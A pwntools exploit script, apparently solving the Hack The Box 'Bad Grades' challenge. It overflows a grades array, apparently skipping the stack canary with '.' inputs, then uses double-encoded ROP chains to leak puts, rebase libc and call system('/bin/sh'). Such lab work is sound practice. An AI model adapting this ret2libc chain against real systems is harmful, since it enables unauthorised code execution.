# HTB - Bad Grades

from pwn import *
import struct

p = process("./grades")
# gdb.attach(p, "b *0x0401106")


def make_double(address):
    val = p64(address).hex()
    return str(struct.unpack("d", bytes.fromhex(val))[0])


elf = ELF("./grades")
libc = ELF("./libc.so.6")

rop = ROP(elf)
rop2 = ROP(libc)

p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'Number of grades:')

popRdi = rop.find_gadget(["pop rdi"])[0]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main = 0x401108

p.sendline(b'39')
for i in range(35):
    p.recvuntil(b']:')
    p.sendline(b'.')

p.recvuntil(b']:')
p.sendline(make_double(popRdi))
p.recvuntil(b']:')
p.sendline(make_double(puts_got))
p.recvuntil(b']:')
p.sendline(make_double(puts_plt))
p.recvuntil(b']:')
p.sendline(make_double(main))

p.recvuntil(b'\n')
leak = u64(p.recvuntil(b'\n').strip().ljust(8, b'\x00'))
print(hex(leak), hex(libc.symbols["puts"]))

libc.address = leak - libc.symbols["puts"]
log.info("libc rebased to: " + hex(libc.address))

p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'Number of grades:')
p.sendline(b'39')
for i in range(35):
    p.recvuntil(b']:')
    p.sendline(b'.')

ret = rop2.find_gadget(["ret"])[0]
popRdi = rop2.find_gadget(["pop rdi", "ret"])[0]
system = libc.symbols["system"]
sh = next(libc.search(b'/bin/sh\x00'))

p.recvuntil(b']:')
p.sendline(make_double(ret))
p.recvuntil(b']:')
p.sendline(make_double(popRdi))
p.recvuntil(b']:')
p.sendline(make_double(sh))
p.recvuntil(b']:')
p.sendline(make_double(system))

p.interactive()
